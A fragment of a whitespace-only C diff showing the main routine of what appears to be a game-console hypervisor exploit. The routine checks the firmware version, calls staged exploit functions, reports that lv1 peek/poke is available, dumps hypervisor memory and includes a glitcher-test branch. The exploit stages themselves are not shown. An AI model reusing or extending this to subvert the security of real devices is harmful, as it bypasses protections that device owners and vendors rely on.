-            fwVersion = strtod(bufs + 8, NULL);
-        }
-    }
+			fwVersion = strtod(bufs + 8, NULL);
+		}
+	}
 
-    PrintLog("fwVersion = %lf\n", fwVersion);
+	PrintLog("fwVersion = %lf\n", fwVersion);
 
-    if (fwVersion < 4.70)
-    {
-        PrintLog("firmware not supported!\n");
+	if (fwVersion < 4.70)
+	{
+		PrintLog("firmware not supported!\n");
 
-        abort();
-        return 0;
-    }
+		abort();
+		return 0;
+	}
 
-    WaitInMs(500);
+	WaitInMs(500);
 
 #if 1
 
 #if STAGE1_CFW
-    Stage1_CFW();
+	Stage1_CFW();
 #else
-    Stage1_v2();
+	Stage1_v2();
 #endif
 
-    Stage2_114();
+	Stage2_114();
 
-    PrintLog("lv1_peek/poke now available.\n");
+	PrintLog("lv1_peek/poke now available.\n");
 
-    DumpLv1();
+	DumpLv1();
 
 #else
 
-    GlitcherTest();
+	GlitcherTest();
 
 #endif
 
-    PrintLog("Bye!\n");
+	PrintLog("Bye!\n");
 
-    DestroyLogging();
+	DestroyLogging();
 
-    Sleep(5);
-    lv2_beep_long();
-    Sleep(5);
-    lv2_beep_triple();
+	Sleep(5);
+	lv2_beep_long();
+	Sleep(5);
+	lv2_beep_triple();
 
-    return 0;
+	return 0;
 }
